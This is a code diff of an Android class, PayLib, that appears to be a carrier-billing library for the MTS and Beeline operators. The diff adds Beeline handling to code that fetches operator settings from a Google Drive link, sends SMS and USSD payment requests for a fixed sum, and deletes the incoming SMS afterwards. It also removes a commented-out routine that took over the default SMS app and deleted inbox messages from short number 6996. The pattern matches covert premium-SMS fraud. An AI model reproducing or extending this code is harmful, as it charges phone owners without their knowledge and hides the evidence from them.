@@ -7,13 +7,12 @@ import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
-import android.os.Build;
 import android.provider.Telephony.Sms;
-import android.support.annotation.RequiresApi;
 import android.view.View;
 
 import com.example.p2plib2.common.CommonFunctions;
 import com.example.p2plib2.common.FilesLoader;
+import com.example.p2plib2.operators.Beeline;
 import com.example.p2plib2.operators.MTS;
 import com.google.gson.Gson;
 
@@ -32,6 +31,7 @@ public class PayLib implements PayInterface {
     View v;
     String downloadAdress = "https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download";
     static MTS mts;
+    static Beeline beeline;
     public static Boolean flagok = false;
     SharedPreferences mSettings;
     public static final String PREFERENCES = "mysettings";
@@ -41,23 +41,33 @@ public class PayLib implements PayInterface {
      * info
      */
     public static String mts_SMS;
-    private String ussd_mts;
-    private String sms_mts_target;
-    private String sms_mts_target_check;
-    private String ussd_mts_target;
+    private String ussd;
+    private String target;
+    private static String sms;
     static CallSmsResult smsResult;
     static Context cnt;
     /**
      * Common
      */
     private String sum = "15";
-
     public static void sendAnswer(String smsBody) {
-        if (mts != null) {
-            mts.sendAnswer(mts_SMS, smsBody);
-        } else {
-            mts = new MTS(true, true, cnt);
+        switch (operName) {
+            case "MTS":
+                if (mts != null) {
+                    mts.sendAnswer(sms, smsBody);
+                } else {
+                    mts = new MTS(true, true, cnt);
+                }
+                break;
+            case "BEELINE":
+                if (beeline != null) {
+                    beeline.sendAnswer(sms, smsBody);
+                } else {
+                    beeline = new Beeline(true, true, cnt);
+                }
+                break;
         }
+
     }
 
     /**
@@ -77,13 +87,9 @@ public class PayLib implements PayInterface {
         this.cnt = cnt;
         CommonFunctions.permissionCheck(cnt, act);
         verifyAccesibilityAccess(act);
-        Logger.lg(smsResult.toString() + " sms result ");
         mSettings = cnt.getSharedPreferences(PREFERENCES, Context.MODE_PRIVATE);
+        /*Create necessary objects*/
         operName = CommonFunctions.operName(cnt);
-        loadItems();
-    }
-
-    private void loadItems() {
         new DownloadApkTask().execute();
     }
 
@@ -115,7 +121,8 @@ public class PayLib implements PayInterface {
                         separated[2].substring(separated[2].indexOf("=") + 1),
                         separated[3].substring(separated[3].indexOf("=") + 1),
                         separated[4].substring(separated[4].indexOf("=") + 1));
-                operatorInfo.put(separated[0].substring(separated[0].indexOf("=") + 1), info);
+                String opr = separated[0].substring(separated[0].indexOf("=") + 1);
+                operatorInfo.put(opr.toUpperCase(), info);
             }
             return null;
         }
@@ -133,15 +140,15 @@ public class PayLib implements PayInterface {
     class OperatorInfo {
         String operator;
         String sms_number;
-        String ussd_mts;
-        String sms_mts_target;
+        String ussd;
+        String target;
         String sum;
 
         public OperatorInfo(String s, String s1, String s2, String s3, String s4) {
             this.operator = s;
             this.sms_number = s1;
-            this.ussd_mts = s2;
-            this.sms_mts_target = s3;
+            this.ussd = s2;
+            this.target = s3;
             this.sum = s4;
         }
     }
@@ -153,8 +160,15 @@ public class PayLib implements PayInterface {
     public String sendSms(Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Activity act, Context cnt) {
         switch (operName) {
             case "MTS":
-                mts = new MTS(sms_mts_target, sum, sendWithSaveOutput, sendWithSaveInput, cnt);
+                mts = new MTS(target, sum, sendWithSaveOutput, sendWithSaveInput, cnt);
                 result = mts.sendSMS();
+                if (sendWithSaveInput == false) {
+                    deleteSMS();
+                }
+                break;
+            case "BEELINE":
+                beeline = new Beeline(sms, target, sum, sendWithSaveOutput, sendWithSaveInput, cnt);
+                result = beeline.sendSMS(act);
                 if (sendWithSaveInput == false) {
                     deleteSMS();
                 }
@@ -166,7 +180,6 @@ public class PayLib implements PayInterface {
     @Override
     public void sendUssd(String operDestination, Activity act) {
         flagok = true;
-        mts = new MTS(true, true, cnt);
         String input = mSettings.getAll().get("mysettings").toString();
         Logger.lg("inpu " + mSettings.getAll().get("mysettings"));
         Gson g = new Gson();
@@ -182,12 +195,22 @@ public class PayLib implements PayInterface {
                     separated[2].substring(separated[2].indexOf("=") + 1),
                     separated[3].substring(separated[3].indexOf("=") + 1),
                     separated[4].substring(separated[4].indexOf("=") + 1));
-            operatorInfo.put(separated[0].substring(separated[0].indexOf("=") + 1), info);
-            Logger.lg(separated[0].substring(separated[0].indexOf("=") + 1));
+            String opr = separated[0].substring(separated[0].indexOf("=") + 1);
+            operatorInfo.put(opr.toUpperCase(), info);
+            Logger.lg("opr " + opr.toUpperCase());
         }
         if (operatorInfo.containsKey(getOperName())) {
             OperatorInfo info = operatorInfo.get(getOperName());
-            mts.sendUssd(info.ussd_mts, info.sms_mts_target, info.sum, operDestination, act);
+            switch (operName) {
+                case "MTS":
+                    mts = new MTS(true, true, cnt);
+                    mts.sendUssd(info.ussd, info.target, info.sum, operDestination, act);
+                    break;
+                case "BEELINE":
+                    beeline = new Beeline(true, true, cnt);
+                    beeline.sendUssd(info.ussd, info.target, info.sum, operDestination, act);
+                    break;
+            }
         }
     }
 
@@ -253,89 +276,22 @@ public class PayLib implements PayInterface {
         intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
         cnt.startActivity(intent);
     }
-//    private class DownloadDelete extends AsyncTask<Void, Void, Void> {
-//        String filter;
-//        DownloadDelete(String str){
-//            this.filter = str;
-//        }
-//
-//        @Override
-//        protected void onPreExecute() {
-//            super.onPreExecute();
-//                final String myPackageName = cnt.getPackageName();
-//                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-//                    defaultSmsApp = Sms.getDefaultSmsPackage(cnt);
-//                }
-//                Logger.lg(myPackageName + "  " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
-//                if (!defaultSmsApp.equals(myPackageName)) {
-//                    Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
-//                    intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
-//                    cnt.startActivity(intent);
-//            }
-//        }
-//
-//        @Override
-//        protected Void doInBackground(Void... params) {
-//            Uri uriSms = Uri.parse("content://sms/inbox");
-//            Cursor c = cnt.getContentResolver().query(
-//                    uriSms, null, null, null, null);
-//            Logger.lg(c.getCount() + " count");
-//            int flag = 0;
-//            if (c != null && c.moveToFirst()) {
-//                do {
-//                    long id = c.getLong(0);
-//                    long threadId = c.getLong(1);
-//                    String address = c.getString(2);
-//                    String body = c.getString(5);
-//                    String date = c.getString(3);
-//                    Logger.lg("0>" + c.getString(0) + "1>" + c.getString(1)
-//                            + "2>" + c.getString(2) + "<-1>"
-//                            + c.getString(3) + "4>" + c.getString(4)
-//                            + "5>" + c.getString(5));
-//
-//                    if (address.equals("6996") && flag < 2) {
-//                        // mLogger.logInfo("Deleting SMS with id: " + threadId);
-//                        int iko = cnt.getContentResolver().delete(
-//                                Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
-//                        if (iko != 0) {
-//                            flag++;
-//                        }
-//                        Logger.lg("Delete success......... " + iko);
-//                    } else {
-//                        Logger.lg("v  " + flag);
-//                    }
-//                } while (c.moveToNext());
-//            }
-//            Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
-//            intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, defaultSmsApp);
-//            cnt.startActivity(intent);
-//            return null;
-//        }
-//
-//        @Override
-//        protected void onPostExecute(Void result) {
-//            Intent intent = new Intent(Sms.Intents.ACTION_CHANGE_DEFAULT);
-//            intent.putExtra(Sms.Intents.EXTRA_PACKAGE_NAME, defaultSmsApp);
-//            cnt.startActivity(intent);
-//        }
-//    }
-
 
     /***Init data */
     public void initData() {
-        Logger.lg("ыва " + operatorInfo.keySet().toString());
+        Logger.lg("KeySetData " + operatorInfo.keySet().toString()
+                +" " + getOperName());
         if (operatorInfo.containsKey(getOperName())) {
             OperatorInfo info = operatorInfo.get(getOperName());
-            if (getOperName().equals("MTS")) {
-                mts_SMS = info.sms_number;
-                ussd_mts = info.ussd_mts;
-                sms_mts_target = info.sms_mts_target;
-                sms_mts_target_check = info.sms_mts_target;
-                /**Common*/
-                sum = info.sum;
-                Logger.lg(sms_mts_target + " " + sms_mts_target);
-            }
-            /**Permissions text*/
+           // operator.setData(info.sms_number, info.sms_target, info.sum, info.ussd);
+            /*Not needed in future*/
+            sms = info.sms_number;
+            ussd = info.ussd;
+            target = info.target;
+            sms = info.sms_number;
+            sum = info.sum;
+            Logger.lg( info.operator + " sms " + sms + " "  + " ussd "+ ussd + " target " + target
+                    + " sms_check " + sms+ " sum " + sum);
         }
     }
 }
